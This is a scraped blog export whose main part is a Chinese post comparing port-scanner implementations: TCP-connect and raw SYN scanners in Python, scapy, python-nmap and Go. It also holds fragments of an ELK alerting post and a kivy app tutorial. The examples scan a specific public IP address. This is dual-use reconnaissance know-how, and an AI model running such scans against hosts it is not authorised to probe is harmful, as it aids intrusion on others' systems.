12345678910111213141516171819202122232425262728sentinl: es: timefield: ‘@timestamp’ default_index: watcher type: watch alarm_index: watcher_alarms sentinl: history: 20 results: 50 settings: email: active: false user: username password: password host: smtp.server.com ssl: true timeout: 10000 # mail server connection timeout slack: active: false username: username hook: ‘https://hooks.slack.com/services/&lt;token&gt;&#39; channel: ‘#channel’ report: active: false tmp_path: /tmp/ pushapps: active: false api_key: ‘&lt;pushapps API Key&gt;’ raw1234567891011121314151617181920212223242526272829303132333435363738394041“input”: &#123; “search”: &#123; “request”: &#123; “index”: [ “&lt;xxx-&#123;now/d&#125;&gt;” ], “body”: &#123; “query”: &#123; “bool”: &#123; “should”: [ &#123; “match”: &#123; “status”: “502” &#125; &#125;, &#123; “match”: &#123; “status”: “404” &#125; &#125; ], “minimum_should_match”: 1, #must setup “filter”: &#123; “range”: &#123; “@timestamp”: &#123; “gte”: “now-60s”, “lte”: “now” &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125;, “condition”: &#123; “script”: &#123; “script”: “payload.hits.total &gt; 30” &#125; &#125;,","categories":[],"tags":[{"name":"ELK","slug":"ELK","permalink":"http://chucz.club/tags/ELK/"}]},{"title":"端口扫描器的几种代码实现方案","slug":"端口扫描器的几种代码实现方案","date":"2018-05-20T18:13:36.000Z","updated":"2018-09-28T08:51:24.508Z","comments":true,"path":"2018/05/20/端口扫描器的几种代码实现方案/","link":"","permalink":"http://chucz.club/2018/05/20/端口扫描器的几种代码实现方案/","excerpt":"","text":"这雨夜太漫长 失眠的我 在谁梦里 歌唱 搞安全的应该都知道端口扫描在渗透测试、漏洞扫描过程中的重要性，其与URL爬虫等技术构成了漏洞扫描的第一阶段，即目标信息收集。因此能否开发出一款高效稳定的端口扫描器，往往决定了漏洞扫描器的好坏。那么说到端口扫描器，我们往往会先想到nmap、masscan等神器，它们是这个领域的标杆。但本篇并不是为了介绍这几款工具，而是谈谈如何自研一款高效稳定的端口扫描器。 端口扫描器，顾名思义就是为了探测服务器上的某个端口是否开放，究其原理可以分为很多种探测方式，比如tcp三次握手扫描，syn扫描等等，本篇并不打算详细介绍这些扫描方式的区别，有兴趣的可以看下nmap的文档，对这几种扫描方式有详细的介绍。 那么说下本文重点，基于这几天我研究并尝试利用python、go开发tcp扫描器、tcp-syn扫描器，以及对比它们之间的速度性能、稳定性差异情况，将测试结果在此做个记录，并分享一下代码以及方案。 说明：文章结尾将给出本篇所使用代码的Github地址，可供大家测试，代码测试环境为centos7。 scan for Python SocketPython的Socket模块可以创建套接字，创建tcp三次握手连接，以此探测目标端口是否存活。本篇将使用socket模块编写tcp扫描以及syn扫描，并对比两者的差异。 tcp scan快来看代码： 12345678910111213141516171819202122232425262728293031#! -- coding:utf-8 --import timeimport socketsocket_timeout = 0.1def tcp_scan(ip,port): try: s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.settimeout(socket_timeout) c=s.connect_ex((ip,port)) if c==0: print “%s:%s is open” % (ip,port) else: # print “%s:%s is not open” % (ip,port) pass except Exception,e: print e s.close()if name==“main“: s_time = time.time() ip = “14.215.177.38” for port in range(0,1024): ‘’‘ 此处可用协作 ‘‘’ tcp_scan(ip,port) e_time = time.time() print “scan time is “,e_time-s_time 运行结果： 说明一下：可以看到此代码扫描1024个端口用了102s，当然代码并没有用多线程、协程等方式提高扫描效率（使用协程测试过扫65535个端口用时400s左右），因为python在这方面的能力比较弱；由于扫描过程中会建立tcp三次握手，因此比较消耗资源。 tcp syn scan 相对tcp扫描，tcp syn扫描方式更为隐蔽，也更节省资源，那么如何利用socket模块实现tcp syn扫描呢？这里需要用到SOCK_RAW，这个在socket编程中相对少用，资料也不多。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141# -- coding: UTF-8 -- import timeimport randomimport socketimport sysfrom struct import ‘’‘Warning:must run it as rootyum install python-devel libpcap-develpip install pcap‘‘’def checksum(msg): ‘’‘ Check Summing ‘‘’ s = 0 for i in range(0,len(msg),2): w = (ord(msg[i]) &lt;&lt; 8) + (ord(msg[i+1])) s = s+w s = (s&gt;&gt;16) + (s &amp; 0xffff) s = ~s &amp; 0xffff return sdef CreateSocket(source_ip,dest_ip): ‘’‘ create socket connection ‘‘’ try: s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) except socket.error, msg: print ‘Socket create error: ‘,str(msg[0]),‘message: ‘,msg[1] sys.exit() ‘’‘ Set the IP header manually ‘‘’ s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1) return sdef CreateIpHeader(source_ip, dest_ip): ‘’‘ create ip header ‘‘’ # packet = ‘’ # ip header option headerlen = 5 version = 4 tos = 0 tot_len = 20 + 20 id = random.randrange(18000,65535,1) frag_off = 0 ttl = 255 protocol = socket.IPPROTO_TCP check = 10 saddr = socket.inet_aton ( source_ip ) daddr = socket.inet_aton ( dest_ip ) hl_version = (version &lt;&lt; 4) + headerlen ip_header = pack(‘!BBHHHBBH4s4s’, hl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr) return ip_headerdef create_tcp_syn_header(source_ip, dest_ip, dest_port): ‘’‘ create tcp syn header function ‘‘’ source = random.randrange(32000,62000,1) # randon select one source_port seq = 0 ack_seq = 0 doff = 5 ‘’‘ tcp flags ‘‘’ fin = 0 syn = 1 rst = 0 psh = 0 ack = 0 urg = 0 window = socket.htons (8192) # max windows size check = 0 urg_ptr = 0 offset_res = (doff &lt;&lt; 4) + 0 tcp_flags = fin + (syn&lt;&lt;1) + (rst&lt;&lt;2) + (psh&lt;&lt;3) + (ack&lt;&lt;4) + (urg&lt;&lt;5) tcp_header = pack(‘!HHLLBBHHH’, source, dest_port, seq, ack_seq, offset_res, tcp_flags, window, check, urg_ptr) ‘’‘ headers option ‘‘’ source_address = socket.inet_aton( source_ip ) dest_address = socket.inet_aton( dest_ip ) placeholder = 0 protocol = socket.IPPROTO_TCP tcp_length = len(tcp_header) psh = pack(‘!4s4sBBH’, source_address, dest_address, placeholder, protocol, tcp_length); psh = psh + tcp_header; tcp_checksum = checksum(psh) ‘’‘ Repack the TCP header and fill in the correct checksum ‘‘’ tcp_header = pack(‘!HHLLBBHHH’, source, dest_port, seq, ack_seq, offset_res, tcp_flags, window, tcp_checksum, urg_ptr) return tcp_headerdef syn_scan(source_ip, dest_ip, des_port) : s = CreateSocket(source_ip, dest_ip) ip_header = CreateIpHeader(source_ip, dest_ip) tcp_header = create_tcp_syn_header(source_ip, dest_ip, des_port) packet = ip_header + tcp_header s.sendto(packet, (dest_ip, 0)) data = s.recvfrom(1024) [0][0:] ip_header_len = (ord(data[0]) &amp; 0x0f) 4 # ip_header_ret = data[0: ip_header_len - 1] tcp_header_len = (ord(data[32]) &amp; 0xf0)&gt;&gt;2 tcp_header_ret = data[ip_header_len:ip_header_len+tcp_header_len - 1] ‘’‘ SYN/ACK flags ‘‘’ if ord(tcp_header_ret[13]) == 0x12: print “%s:%s is open” % (dest_ip,des_port) else: print “%s:%s is not open” % (dest_ip,des_port)if name==“main“: t_s = time.time() source_ip = ‘’ # 填写本机ip dest_ip = ‘14.215.177.38’ for des_port in range(1024): syn_scan(source_ip, dest_ip, des_port) t_e = time.time() print “time is “,(t_e-t_s) 有一点需要注意的，运行这段代码前，需要在系统上安装依赖: 12yum install python-devel libpcap-develpip install pcap 运行结果： 说明：从运行结果上来看，并没有很准确，而且速度也不快，不清楚是不是代码上有问题。 scan for Python scapy除了socket模块外，python还有一个scapy模块，可以用来模拟发包，但只能在linux下使用，其他操作系统不建议使用此模块。 tcp syn csan代码在这里： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#! -- coding:utf-8 --import timefrom scapy.all import *ip = “14.215.177.38”TIMEOUT = 0.5threads = 500port_range = 1024retry = 1def is_up(ip): “”“ Tests if host is up ““” icmp = IP(dst=ip)/ICMP() resp = sr1(icmp, timeout=TIMEOUT) if resp == None: return False else: return Truedef reset_half_open(ip, ports): # Reset the connection to stop half-open connections from pooling up sr(IP(dst=ip)/TCP(dport=ports, flags=‘AR’), timeout=TIMEOUT)def is_open(ip, ports): to_reset = [] results = [] p = IP(dst=ip)/TCP(dport=ports, flags=‘S’) # Forging SYN packet answers, un_answered = sr(p, verbose=False, retry=retry ,timeout=TIMEOUT) # Send the packets for req, resp in answers: if not resp.haslayer(TCP): continue tcp_layer = resp.getlayer(TCP) if tcp_layer.flags == 0x12: # port is open to_reset.append(tcp_layer.sport) results.append(tcp_layer.sport) elif tcp_layer.flags == 0x14: # port is open pass reset_half_open(ip, to_reset) return resultsdef chunks(l, n): “”“Yield successive n-sized chunks from l.”“” for i in range(0, len(l), n): yield l[i:i + n]if name == ‘main‘: start_time = time.time() open_port_list = [] for ports in chunks(list(range(port_range)), threads): results = is_open(ip, ports) if results: open_port_list += results end_time = time.time() print “%s %s” % (ip,open_port_list) print “%s Scan Completed in %fs” % (ip, end_time-start_time) 运行结果： 说明：由于scapy可以一次性发多个syn包，因此速度相对socket更快一些，但稳定性没有很好。 scan for python+nmap文章开头提到了nmap，其实在python中也可以直接调用nmap，看代码： 123456789101112131415161718192021222324252627#! -- coding:utf-8 --‘’‘pip install python-nmap‘‘’import nmapnm =nmap.PortScanner()def scan(ip,port,arg): try: nm.scan(ip, arguments=arg+str(port)) except nmap.nmap.PortScannerError: print “Please run -O method for root privileges” else: for host in nm.all_hosts(): for proto in nm[host].all_protocols(): lport = nm[host][proto].keys() lport.sort() for port in lport: print (‘port : %s\\tstate : %s’ % (port, nm[host][proto][port][‘state’]))if name==“main“: port=“80,443,22,21” scan(ip=“14.215.177.38”,port=port,arg=“-sS -Pn -p”) # tcp scan -sT # tcp syn scan -sS 运行结果：由于nmap扫描速度相对比较慢，因此这里只演示扫描4个端口，不做速度的对比，当然其稳定性还是可以的。 scan for go 前文一直在介绍使用python语言开发端口扫描器，然而由于python在多线程方面的弱势，扫描器的性能可想而知，因此我又利用go语言的高并发性优势，尝试开发端口扫描器。（题外话：为此我花了半天时间看了下go语言的基础，勉强看懂了扫描代码，并做了一些修改） tcp scan直接看代码吧： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121package main// port tcp scanimport ( “fmt” “net” “os” “runtime” “strconv” “sync” “time”)func loop(inport chan int, startport, endport int) &#123; for i := startport; i &lt;= endport; i++ &#123; inport &lt;- i &#125; close(inport)&#125;type ScanSafeCount struct &#123; // 结构体 count int mux sync.Mutex&#125;var scanCount ScanSafeCountfunc scanner(inport int, outport chan int, ip string, endport int) &#123; // 扫描函数 in := inport // 定义要扫描的端口号 // fmt.Printf(“ %d “, in) // 输出扫描的端口 host := fmt.Sprintf(“%s:%d”, ip, in) // 类似（ip,port） tcpAddr, err := net.ResolveTCPAddr(“tcp4”, host) // 根据域名查找ip if err != nil &#123; // 域名解析ip失败 outport &lt;- 0 &#125; else &#123; conn, err := net.DialTimeout(“tcp”, tcpAddr.String(), 10time.Second) //建立tcp连接 if err != nil &#123; // tcp连接失败 outport &lt;- 0 &#125; else &#123; // tcp连接成功 outport &lt;- in // 将端口写入outport信号 fmt.Printf(“\\n **( %d 可以 )*\\n”, in) conn.Close() &#125; &#125; // 线程锁 scanCount.mux.Lock() scanCount.count = scanCount.count - 1 if scanCount.count &lt;= 0 &#123; close(outport) &#125; scanCount.mux.Unlock()&#125;func main() &#123; runtime.GOMAXPROCS(runtime.NumCPU()) // 设置最大可使用的cpu核数 // 定义变量 inport := make(chan int) // 信号变量，类似python中的queue outport := make(chan int) collect := []int&#123;&#125; // 定义一个切片变量，类似python中的list // fmt.Println(os.Args, len(os.Args)) // 获取命令行参数并输出 if len(os.Args) != 4 &#123; // 命令行参数个数有误 fmt.Println(“使用方式： port_scanner IP startport endport”) os.Exit(0) &#125; s_time := time.Now().Unix() // fmt.Println(“扫描开始：”) // 获取当前时间 ip := string(os.Args[1]) // 获取参数中的ip startport, _ := strconv.Atoi(os.Args[2]) // 获取参数中的启始端口 endport, _ := strconv.Atoi(os.Args[3]) // 获取参数中的结束端口 if startport &gt; endport &#123; fmt.Println(“Usage: scanner IP startport endport”) fmt.Println(“Endport must be larger than startport”) os.Exit(0) &#125; else &#123; // 定义scanCount变量为ScanSafeCount结构体，即计算扫描的端口数量 scanCount = ScanSafeCount&#123;count: (endport - startport + 1)&#125; &#125; fmt.Printf(“扫描 %s：%d———-%d\\n”, ip, startport, endport) go loop(inport, startport, endport) // 执行loop函数将端口写入input信号 for v := range inport &#123; // 开始循环input go scanner(v, outport, ip, endport) &#125; // 输出结果 for port := range outport &#123; if port != 0 &#123; collect = append(collect, port) &#125; &#125; fmt.Println(“–”) fmt.Println(collect) e_time := time.Now().Unix() fmt.Println(“扫描时间:”, e_time-s_time)&#125; 代码我就不解释了（我在代码中加了些注释，应该大致可以看懂），本文也不打算介绍go的用法，毕竟自己也是刚开始学习go，有兴趣的可以看看go的文档，然后再回过头来看看这段代码。 代码运行结果： 说明：由于是tcp扫描，所以多少还是占资源的，而且测试发现稳定性不是很好。 tcp syn scan看代码看代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291package main// port tcp syn scanimport ( “bytes” “encoding/binary” “flag” “fmt” “log” “math/rand” “net” “os” “strconv” “strings” “time” “errors”)//TCPHeader testtype TCPHeader struct &#123; SrcPort uint16 DstPort uint16 SeqNum uint32 AckNum uint32 Flags uint16 Window uint16 ChkSum uint16 UrgentPointer uint16&#125;//TCPOption testtype TCPOption struct &#123; Kind uint8 Length uint8 Data []byte&#125;type scanResult struct &#123; Port uint16 Opened bool&#125;type scanJob struct &#123; Laddr string Raddr string SPort uint16 DPort uint16 Stop uint8&#125;var stopFlag = make(chan uint8, 1)func main() &#123; rate := time.Second / 400 throttle := time.Tick(rate) jobs := make(chan scanJob, 65536) results := make(chan scanResult, 1000) for w := 0; w &lt; 10; w++ &#123; go worker(w, jobs, throttle, results) &#125; // 获取命令行参数 ifaceName := flag.String(“i”, “eth0”, “Specify network”) remote := flag.String(“r”, “”, “remote address”) portRange := flag.String(“p”, “1-1024”, “port range: -p 1-1024”) flag.Parse() // ifaceName := &amp;interfaceName_ // remote := &amp;remote_ // portRange := &amp;portRange_ s_time := time.Now().Unix() laddr := interfaceAddress(ifaceName) // raddr := remote minPort , maxPort := portSplit(portRange) // fmt.Println(laddr, raddr) // 输出源ip地址，目标ip地址 go func(num int)&#123; for i := 0; i &lt; num; i++ &#123; recvSynAck(laddr, raddr, results) &#125; &#125;(10) go func(jobLength int) &#123; for j := minPort; j &lt; maxPort + 1; j++ &#123; s := scanJob&#123; Laddr: laddr, Raddr: raddr, SPort: uint16(random(10000, 65535)), DPort: uint16(j + 1), &#125; jobs &lt;- &amp;s &#125; jobs &lt;- &amp;scanJob&#123;Stop: 1&#125; &#125;(1024) for &#123; select &#123; case res := &lt;-results: fmt.Println(“扫描到开放的端口:”,res.Port) case &lt;-stopFlag: e_time := time.Now().Unix() fmt.Println(“总共用了多少时间(s):”,e_time-s_time) os.Exit(0) &#125; &#125;&#125;func worker(id int, jobs &lt;-chan scanJob, th &lt;-chan time.Time, results chan&lt;- scanResult) &#123; for j := range jobs &#123; if j.Stop != 1 &#123; sendSyn(j.Laddr, j.Raddr, j.SPort, j.DPort) &#125; else &#123; stopFlag &lt;- j.Stop &#125; &lt;-th &#125;&#125;func checkError(err error) &#123; // 错误check if err != nil &#123; log.Println(err) &#125;&#125;//CheckSum testfunc CheckSum(data []byte, src, dst [4]byte) uint16 &#123; pseudoHeader := []byte&#123; src[0], src[1], src[2], src[3], dst[0], dst[1], dst[2], dst[3], 0, 6, 0, byte(len(data)), &#125; totalLength := len(pseudoHeader) + len(data) if totalLength%2 != 0 &#123; totalLength++ &#125; d := make([]byte, 0, totalLength) d = append(d, pseudoHeader…) d = append(d, data…) return ^mySum(d)&#125;func mySum(data []byte) uint16 &#123; var sum uint32 for i := 0; i &lt; len(data)-1; i += 2 &#123; sum += uint32(uint16(data[i])&lt;&lt;8 | uint16(data[i+1])) &#125; sum = (sum &gt;&gt; 16) + (sum &amp; 0xffff) sum = sum + (sum &gt;&gt; 16) return uint16(sum)&#125;func sendSyn(laddr, raddr string, sport, dport uint16) &#123; conn, err := net.Dial(“ip4:tcp”, raddr) checkError(err) defer conn.Close() op := []TCPOption&#123; TCPOption&#123; Kind: 2, Length: 4, Data: []byte&#123;0x05, 0xb4&#125;, &#125;, TCPOption&#123; Kind: 0, &#125;, &#125; tcpH := TCPHeader&#123; SrcPort: sport, DstPort: dport, SeqNum: rand.Uint32(), AckNum: 0, Flags: 0x8002, Window: 8192, ChkSum: 0, UrgentPointer: 0, &#125; buff := new(bytes.Buffer) err = binary.Write(buff, binary.BigEndian, tcpH) checkError(err) for i := range op &#123; binary.Write(buff, binary.BigEndian, op[i].Kind) binary.Write(buff, binary.BigEndian, op[i].Length) binary.Write(buff, binary.BigEndian, op[i].Data) &#125; binary.Write(buff, binary.BigEndian, [6]byte&#123;&#125;) data := buff.Bytes() checkSum := CheckSum(data, ipstr2Bytes(laddr), ipstr2Bytes(raddr)) //fmt.Printf(“CheckSum 0x%X\\n”, checkSum) tcpH.ChkSum = checkSum buff = new(bytes.Buffer) binary.Write(buff, binary.BigEndian, tcpH) for i := range op &#123; binary.Write(buff, binary.BigEndian, op[i].Kind) binary.Write(buff, binary.BigEndian, op[i].Length) binary.Write(buff, binary.BigEndian, op[i].Data) &#125; binary.Write(buff, binary.BigEndian, [6]byte&#123;&#125;) data = buff.Bytes() //fmt.Printf(“% X\\n”, data) _, err = conn.Write(data) checkError(err)&#125;func recvSynAck(laddr, raddr string, res chan&lt;- scanResult) error &#123; listenAddr, err := net.ResolveIPAddr(“ip4”, laddr) // 解析域名为ip checkError(err) conn, err := net.ListenIP(“ip4:tcp”, listenAddr) defer conn.Close() checkError(err) for &#123; buff := make([]byte, 1024) _, addr, err := conn.ReadFrom(buff) if err != nil &#123; continue &#125; if addr.String() != raddr || buff[13] != 0x12 &#123; continue &#125; var port uint16 binary.Read(bytes.NewReader(buff), binary.BigEndian, &amp;port) res &lt;- &amp;scanResult&#123; Port: port, Opened: true, &#125; &#125;&#125;func ipstr2Bytes(addr string) [4]byte &#123; s := strings.Split(addr, “.”) b0, _ := strconv.Atoi(s[0]) b1, _ := strconv.Atoi(s[1]) b2, _ := strconv.Atoi(s[2]) b3, _ := strconv.Atoi(s[3]) return [4]byte&#123;byte(b0), byte(b1), byte(b2), byte(b3)&#125;&#125;func random(min, max int) int &#123; return rand.Intn(max-min) + min&#125;func interfaceAddress(ifaceName string ) string &#123; iface, err:= net.InterfaceByName(ifaceName) if err != nil &#123; panic(err) &#125; addr, err := iface.Addrs() if err != nil &#123; panic(err) &#125; addrStr := strings.Split(addr[0].String(), “/“)[0] return addrStr&#125;func portSplit(portRange string) (uint16, uint16) &#123; ports := strings.Split(*portRange, “-“) minPort, err := strconv.ParseUint(ports[0], 10, 16) if err !=nil &#123; panic(err) &#125; maxPort, err := strconv.ParseUint(ports[1], 10, 16) if err != nil &#123; panic(err) &#125; if minPort &gt; maxPort &#123; panic(errors.New(“minPort must greater than maxPort”)) &#125; return uint16(minPort), uint16(maxPort)&#125; 代码运行结果：没错，就是2s！我测试了扫描全端口（0-65535），大概120s左右，而且稳定性不错。 scan for go+python 经过前面的测试我们不难发现，在并发的性能上，go完胜python，但go不适合做复杂的逻辑处理，以及web开发之类的。因此如何整合python跟go呢？这里我想了两种方案，第一种将go语言打包成.so动态连接库，利用python的ctypes模块可以调用；第二种是go写成接口，提供python调用。写成接口的方式相对简单一些，因此这里不介绍了，说说如何打包go，即如何利用python调用go的方法或者说函数。 先看下修改过后的tcp_syn_scan.go代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299package main// port tcp syn scanimport ( “C” “os” “bytes” “encoding/binary” “fmt” “log” “math/rand” “net” “strconv” “strings” “time” “errors”)//TCPHeader testtype TCPHeader struct &#123; SrcPort uint16 DstPort uint16 SeqNum uint32 AckNum uint32 Flags uint16 Window uint16 ChkSum uint16 UrgentPointer uint16&#125;//TCPOption testtype TCPOption struct &#123; Kind uint8 Length uint8 Data []byte&#125;type scanResult struct &#123; Port uint16 Opened bool&#125;type scanJob struct &#123; Laddr string Raddr string SPort uint16 DPort uint16 Stop uint8&#125;var stopFlag = make(chan uint8, 1)//export Scanfunc Scan(remote_ C.char, portRange_ C.char, interfaceName_ C.char) &#123; rate := time.Second / 400 throttle := time.Tick(rate) jobs := make(chan scanJob, 65536) results := make(chan scanResult, 1000) for w := 0; w &lt; 10; w++ &#123; go worker(w, jobs, throttle, results) &#125; // 获取命令行参数 // ifaceName := flag.String(“i”, “eth0”, “Specify network”) // remote := flag.String(“r”, “”, “remote address”) // portRange := flag.String(“p”, “1-1024”, “port range: -p 1-1024”) // flag.Parse() interfaceName_1 := C.GoString(interfaceName_) remote_1 := C.GoString(remote_) portRange_1 := C.GoString(portRange_) ifaceName := &amp;interfaceName_1 remote := &amp;remote_1 portRange := &amp;portRange_1 s_time := time.Now().Unix() laddr := interfaceAddress(ifaceName) // raddr := remote minPort , maxPort := portSplit(portRange) fmt.Println(laddr, raddr) // 输出源ip地址，目标ip地址 go func(num int)&#123; for i := 0; i &lt; num; i++ &#123; recvSynAck(laddr, raddr, results) &#125; &#125;(10) go func(jobLength int) &#123; for j := minPort; j &lt; maxPort + 1; j++ &#123; s := scanJob&#123; Laddr: laddr, Raddr: raddr, SPort: uint16(random(10000, 65535)), DPort: uint16(j + 1), &#125; jobs &lt;- &amp;s &#125; jobs &lt;- &amp;scanJob&#123;Stop: 1&#125; &#125;(1024) for &#123; select &#123; case res := &lt;-results: fmt.Println(“扫描到开放的端口：”,res.Port) //输出开放的端口号 case &lt;-stopFlag: e_time := time.Now().Unix() fmt.Println(“本次扫描总共耗时(s):”,e_time-s_time) os.Exit(0) &#125; &#125;&#125;func worker(id int, jobs &lt;-chan scanJob, th &lt;-chan time.Time, results chan&lt;- scanResult) &#123; for j := range jobs &#123; if j.Stop != 1 &#123; sendSyn(j.Laddr, j.Raddr, j.SPort, j.DPort) &#125; else &#123; stopFlag &lt;- j.Stop &#125; &lt;-th &#125;&#125;func checkError(err error) &#123; // 错误check if err != nil &#123; log.Println(err) &#125;&#125;//CheckSum testfunc CheckSum(data []byte, src, dst [4]byte) uint16 &#123; pseudoHeader := []byte&#123; src[0], src[1], src[2], src[3], dst[0], dst[1], dst[2], dst[3], 0, 6, 0, byte(len(data)), &#125; totalLength := len(pseudoHeader) + len(data) if totalLength%2 != 0 &#123; totalLength++ &#125; d := make([]byte, 0, totalLength) d = append(d, pseudoHeader…) d = append(d, data…) return ^mySum(d)&#125;func mySum(data []byte) uint16 &#123; var sum uint32 for i := 0; i &lt; len(data)-1; i += 2 &#123; sum += uint32(uint16(data[i])&lt;&lt;8 | uint16(data[i+1])) &#125; sum = (sum &gt;&gt; 16) + (sum &amp; 0xffff) sum = sum + (sum &gt;&gt; 16) return uint16(sum)&#125;func sendSyn(laddr, raddr string, sport, dport uint16) &#123; conn, err := net.Dial(“ip4:tcp”, raddr) checkError(err) defer conn.Close() op := []TCPOption&#123; TCPOption&#123; Kind: 2, Length: 4, Data: []byte&#123;0x05, 0xb4&#125;, &#125;, TCPOption&#123; Kind: 0, &#125;, &#125; tcpH := TCPHeader&#123; SrcPort: sport, DstPort: dport, SeqNum: rand.Uint32(), AckNum: 0, Flags: 0x8002, Window: 8192, ChkSum: 0, UrgentPointer: 0, &#125; buff := new(bytes.Buffer) err = binary.Write(buff, binary.BigEndian, tcpH) checkError(err) for i := range op &#123; binary.Write(buff, binary.BigEndian, op[i].Kind) binary.Write(buff, binary.BigEndian, op[i].Length) binary.Write(buff, binary.BigEndian, op[i].Data) &#125; binary.Write(buff, binary.BigEndian, [6]byte&#123;&#125;) data := buff.Bytes() checkSum := CheckSum(data, ipstr2Bytes(laddr), ipstr2Bytes(raddr)) //fmt.Printf(“CheckSum 0x%X\\n”, checkSum) tcpH.ChkSum = checkSum buff = new(bytes.Buffer) binary.Write(buff, binary.BigEndian, tcpH) for i := range op &#123; binary.Write(buff, binary.BigEndian, op[i].Kind) binary.Write(buff, binary.BigEndian, op[i].Length) binary.Write(buff, binary.BigEndian, op[i].Data) &#125; binary.Write(buff, binary.BigEndian, [6]byte&#123;&#125;) data = buff.Bytes() //fmt.Printf(“% X\\n”, data) _, err = conn.Write(data) checkError(err)&#125;func recvSynAck(laddr, raddr string, res chan&lt;- scanResult) error &#123; listenAddr, err := net.ResolveIPAddr(“ip4”, laddr) // 解析域名为ip checkError(err) conn, err := net.ListenIP(“ip4:tcp”, listenAddr) defer conn.Close() checkError(err) for &#123; buff := make([]byte, 1024) _, addr, err := conn.ReadFrom(buff) if err != nil &#123; continue &#125; if addr.String() != raddr || buff[13] != 0x12 &#123; continue &#125; var port uint16 binary.Read(bytes.NewReader(buff), binary.BigEndian, &amp;port) res &lt;- &amp;scanResult&#123; Port: port, Opened: true, &#125; &#125;&#125;func ipstr2Bytes(addr string) [4]byte &#123; s := strings.Split(addr, “.”) b0, _ := strconv.Atoi(s[0]) b1, _ := strconv.Atoi(s[1]) b2, _ := strconv.Atoi(s[2]) b3, _ := strconv.Atoi(s[3]) return [4]byte&#123;byte(b0), byte(b1), byte(b2), byte(b3)&#125;&#125;func random(min, max int) int &#123; return rand.Intn(max-min) + min&#125;func interfaceAddress(ifaceName string ) string &#123; iface, err:= net.InterfaceByName(ifaceName) if err != nil &#123; panic(err) &#125; addr, err := iface.Addrs() if err != nil &#123; panic(err) &#125; addrStr := strings.Split(addr[0].String(), “/“)[0] return addrStr&#125;func portSplit(portRange string) (uint16, uint16) &#123; ports := strings.Split(portRange, “-“) minPort, err := strconv.ParseUint(ports[0], 10, 16) if err !=nil &#123; panic(err) &#125; maxPort, err := strconv.ParseUint(ports[1], 10, 16) if err != nil &#123; panic(err) &#125; if minPort &gt; maxPort &#123; panic(errors.New(“minPort must greater than maxPort”)) &#125; return uint16(minPort), uint16(maxPort)&#125;func main() &#123; &#125; 然后利用go自身的build命令，将其打包成.so库： 1go build -buildmode=c-shared -o tcp_syn_scan.so tcp_syn_scan.go 打包后会得到一个tcp_syn_scan.so和一个tcp_syn_scan.h。然后利用下面的python代码就可以调用Go代码中的Scan()函数了，创建一个tcp_syn_scan.py文件。 12345#! -- coding:utf-8 --from ctypes import *lib = cdll.LoadLibrary(u‘./scan.so’)lib.Scan(“14.215.177.38”,“1-1024”,“eth0”) # ip,端口范围，网卡 代码运行结果： 说明：相当原生的go，利用python去调用go会损耗一些性能，但总体上还可以。 后记本文结论就是可以利用go开发扫描模块（性能更佳），并结合python调用。本文代码项目地址：https://github.com/tengzhangchao/PortScan 参考文章https://blog.csdn.net/pwc1996/article/details/73469850","categories":[],"tags":[{"name":"编程之道","slug":"编程之道","permalink":"http://chucz.club/tags/编程之道/"}]},{"title":"利用python开发app实战","slug":"利用python开发app实战","date":"2018-05-07T21:35:25.000Z","updated":"2018-09-28T08:51:24.508Z","comments":true,"path":"2018/05/07/利用python开发app实战/","link":"","permalink":"http://chucz.club/2018/05/07/利用python开发app实战/","excerpt":"","text":"你说，我们的未来被装进棺材，染不上尘埃 我很早之前就想开发一款app玩玩，无奈对java不够熟悉，之前也没有开发app的经验，因此一直耽搁了。最近想到尝试用python开发一款app，google搜索了一番后，发现确实有路可寻，目前也有了一些相对成熟的模块，于是便开始了动手实战，过程中发现这其中有很多坑，好在最终依靠google解决了，因此小记一番。 说在前面的话 python语言虽然很万能，但用它来开发app还是显得有点不对路，因此用python开发的app应当是作为编码练习、或者自娱自乐所用，加上目前这方面的模块还不是特别成熟，bug比较多，总而言之，劝君莫轻入。 准备工作 利用python开发app需要用到python的一个模块–kivy，kivy是一个开源的，跨平台的Python开发框架，用于开发使用创新的应用程序。简而言之，这是一个python桌面程序开发框架（类似wxpython等模块），强大的是kivy支持linux、mac、windows、android、ios平台，这也是为什么开发app需要用到这个模块。 虽然kivy是跨平台的，但是想要在不同的平台使用python代码，还需要将python代码打包成对应平台的可执行程序，好在kivy项目下有个打包工具项目–buildozer，这是官方推荐的打包工具，因为相对比较简单，自动化程度高，其他项目比如：python-for-android也能起到类似的作用，这里不展开介绍。 搭建kivy开发环境需要在pc上安装kivy开发环境，这里演示下mac与linux下的安装过程。 install kivy for mac安装一些依赖包： 1brew install pkg-config sdl2 sdl2_image sdl2_ttf sdl2_mixer gstreamer 安装cython以及kivy： 12pip install cython==0.25pip install kivy 如果安装kivy报错，则使用下面的方式安装kivy： 12git clone https://github.com/kivy/kivypython setup.py install 安装后测试： 12345678910$pythonPython 